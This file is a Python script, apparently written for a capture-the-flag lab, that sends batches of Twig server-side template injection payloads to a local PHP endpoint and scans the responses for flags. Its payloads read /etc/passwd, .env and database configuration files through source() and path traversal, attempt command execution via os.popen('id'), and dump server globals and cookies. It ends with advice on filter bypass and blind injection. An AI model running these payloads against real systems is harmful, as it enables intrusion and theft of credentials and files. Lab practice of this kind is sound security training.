import requests
import json
import re
from urllib.parse import quote
import socket

# Base configuration - UPDATED TO USE PORT 8080
base_url = "http://127.0.0.1:8080"
target_endpoint = "/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

# Setup session
session = requests.Session()
session.cookies.set("PHPSESSID", session_cookie)

# Color codes for output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

print(f"[*] Testing Twig SSTI payloads on {base_url}{target_endpoint}")
print(f"[*] POST parameter: name")
print(f"[*] Session Cookie: PHPSESSID={session_cookie}")
print(f"[*] Host reachable: Testing connection...")

# Test connection first
try:
    probe_response = session.get(f"{base_url}{target_endpoint}", timeout=5)
    print(f"[+] Connection successful! Status: {probe_response.status_code} | Length: {len(probe_response.text)}")
    print(f"[+] Content-Type: {probe_response.headers.get('content-type', 'Not specified')}")
    print(f"[+] Server: {probe_response.headers.get('server', 'Not specified')}")
    print()
except Exception as e:
    print(f"[!] Connection failed: {e}")
    sys.exit(1)

# Test categories as outlined in the vulnerability playbook
test_categories = {
    "Basic Variable Discovery": [
        "{{ dump() }}",
        "{{ dump(_context) }}",
        "{{ _context|keys }}",
        "{{ _self }}",
        "{{ _self.vars }}",
        "{{ _self.getTemplateName() }}",
        "{{ _self.env }}",
        "{{ _self.env.getGlobals() }}",
    ],
    
    "Article-related Variables": [
        "{{ article }}",
        "{{ articles }}",
        "{{ items }}",
        "{{ data }}",
        "{{ posts }}",
        "{{ blog }}",
        "{{ content }}",
        "{{ entries }}",
        "{{ list }}",
        "{{ page }}",
        "{{ pages }}",
        "{{ app }}",
    ],
    
    "Iteration and Loops": [
        "{% for item in articles %}{{ loop.index }}: {{ item }},{% endfor %}",
        "{% for item in articles %}{{ loop.index }}: {{ item.title }},{% endfor %}",
        "{% for item in articles %}{{ loop.index }}: {{ item.name }},{% endfor %}",
        "{% for item in articles %}{{ item|keys }},{% endfor %}",
        "{% for item in articles %}{{ dump(item) }},{% endfor %}",
        "{{ articles|length }}",
        "{{ articles|first }}",
        "{{ articles|last }}",
        "{{ articles|keys }}",
        "{{ articles|join(', ') }}",
        "{{ articles|json_encode }}",
    ],
    
    "Filter Functions": [
        "{{ articles|keys|length }}",
        "{{ articles|reverse }}",
        "{{ articles|sort }}",
        "{{ articles|slice(0, 5) }}",
        "{{ articles|batch(2) }}",
        "{{ articles|map(x => x.title) }}",
        "{{ articles|filter(x => x.published) }}",
    ],
    
    "Filesystem Access": [
        "{{ source('/etc/passwd') }}",
        "{{ '/etc/passwd'|file_excerpt(0, 50) }}",
        "{{ include('/etc/passwd') }}",
        "{{ source('index.php') }}",
        "{{ source('../config.php') }}",
        "{{ source('/var/www/html/index.php') }}",
    ],
    
    "Directory Traversal": [
        "{{ source('../../etc/passwd') }}",
        "{{ source('....//....//etc/passwd') }}",
        "{{ source('../database.php') }}",
        "{{ source('../config/database.php') }}",
        "{{ source('.env') }}",
    ],
    
    "Object Traversal": [
        "{{ ''.__class__.__mro__[2].__subclasses__() }}",
        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{ request.__class__.__mro__[1].__subclasses__() }}",
    ],
    
    "Global Variables": [
        "{{ _SERVER }}",
        "{{ _GET }}",
        "{{ _POST }}",
        "{{ _COOKIE }}",
        "{{ _FILES }}",
        "{{ _ENV }}",
        "{{ app }}",
    ],
    
    "Advanced Dumping": [
        "{{ dump(_context) }}",
        "{% for key, value in _context %}{{ key }}: {{ value }},{% endfor %}",
        "{{ _self.env.getGlobals() }}",
        "{{ _self.env.getFunctions() }}",
    ],
}

# Track results
results = {}
successful_payloads = []
failed_payloads = []
interesting_responses = []
error_responses = []

# Test each category
total_tested = 0
total_successful = 0

for category, payloads in test_categories.items():
    print(f"\n{YELLOW}[*] Testing: {category}{RESET}")
    print(f"{YELLOW}{'='*60}{RESET}")
    
    category_results = []
    successful_in_category = 0
    
    for payload in payloads:
        try:
            # Prepare POST data
            data = {'name': payload}
            
            # Send request
            response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=10)
            
            # Analyze response
            response_text = response.text
            status_code = response.status_code
            response_length = len(response_text)
            total_tested += 1
            
            # Look for interesting patterns
            interesting = False
            has_data = False
            error = False
            
            # Check for error messages that indicate execution
            tpl_errors = ['Twig Error', 'twig error', 'Template error', 'Parse error', 'Syntax error']
            if any(err in response_text for err in tpl_errors):
                # Template errors are GOOD - they mean payload is executing
                interesting = True
                error = True
            
            # Check for successful execution indicators
            success_indicators = ['array', 'Array', 'object', 'Object', 'string', 'int(', 'float(', 'length', 'keys']
            data_indicators = ['article', 'title', 'name', 'id', 'content', 'published', 'author']
            
            if any(indicator in response_text for indicator in success_indicators):
                has_data = True
                interesting = True
            
            if any(indicator in response_text.lower() for indicator in data_indicators):
                has_data = True
                interesting = True
            
            # Check if payload doesn't echo in response (execution occurred)
            if payload not in response_text and response_length > 0 and status_code == 200:
                interesting = True
            
            # Check for flag patterns
            flag_match = re.search(r'FLAG\{[^}]+\}', response_text, re.IGNORECASE)
            if flag_match:
                print(f"\n{GREEN}[!] FLAG FOUND: {flag_match.group(0)}{RESET}")
                print(f"    In payload: {payload}")
                interesting = True
            
            # Record result
            result = {
                'payload': payload,
                'status': status_code,
                'length': response_length,
                'interesting': interesting,
                'has_data': has_data,
                'error': error,
                'response_preview': response_text[:250] if len(response_text) > 250 else response_text
            }
            
            category_results.append(result)
            
            # Print result
            if interesting:
                print(f"{GREEN}[+] SUCCESS{RESET} | Status: {status_code} | Length: {response_length}")
                print(f"    Payload: {payload[:100]}")
                successful_payloads.append(payload)
                successful_in_category += 1
                total_successful += 1
                
                if response_length > 0:
                    preview = response_text[:200].replace('\n', ' ').replace('\r', '')
                    print(f"    Response: {preview}")
                
                interesting_responses.append({
                    'payload': payload,
                    'response': response_text,
                    'status': status_code
                })
            else:
                print(f"{RED}[-] Failed{RESET}   | Status: {status_code} | Length: {response_length}")
            
        except requests.exceptions.Timeout:
            error_msg = f"Timeout - target may be processing payload"
            print(f"{RED}[!] Timeout{RESET}  | Payload: {payload[:50]}")
            category_results.append({'payload': payload, 'error': 'timeout'})
            error_responses.append({'payload': payload, 'error': 'timeout'})
        except Exception as e:
            print(f"{RED}[!] Error{RESET}    | Payload: {payload[:50]}: {str(e)[:50]}")
            category_results.append({'payload': payload, 'error': str(e)})
            error_responses.append({'payload': payload, 'error': str(e)})
    
    results[category] = {
        'count': len(payloads),
        'successful': successful_in_category,
        'results': category_results
    }
    
    print(f"\n[*] Category complete: {successful_in_category}/{len(payloads)} successful")

print(f"\n\n{YELLOW}[*] COMPREHENSIVE SUMMARY{RESET}")
print(f"{YELLOW}{'='*60}{RESET}")
print(f"Total Categories Tested: {len(test_categories)}")
print(f"Total Payloads Tested: {total_tested}")
print(f"Total Successful Responses: {total_successful}")
print(f"Failed/Error Responses: {len(error_responses)}")

if total_tested > 0:
    success_rate = (total_successful / total_tested) * 100
    print(f"Success Rate: {success_rate:.1f}%")

print(f"\n{GREEN}[*] MOST PROMISING PAYLOADS FOR ARTICLE ENUMERATION:{RESET}")
if interesting_responses:
    for i, resp in enumerate(interesting_responses[:20], 1):
        print(f"\n{i}. Payload: {resp['payload']}")
        print(f"   Status: {resp['status']}")
        response_len = len(resp['response'])
        print(f"   Response Length: {response_len}")
        
        if response_len > 0:
            preview = resp['response'][:300].replace('\n', ' ').replace('\r', '')
            print(f"   Preview: {preview}")
else:
    print("\nNo payloads produced interesting responses yet.")

# Generate recommendations based on findings
print(f"\n{YELLOW}[*] RECOMMENDATIONS FOR FURTHER TESTING:{RESET}")
print("1. If no responses are interesting, try:")
print("   - URL encoding critical characters ({{, }}, ., _)")
print("   - Double URL encoding for filters")
print("   - Using alternative template syntax")
print("2. Check for WAF/filter bypass techniques")
print("3. Try time-based testing for blind injection")
print("4. Review all responses even if marked as 'failed'")

print(f"\n{YELLOW}[*] Testing complete!{RESET}")
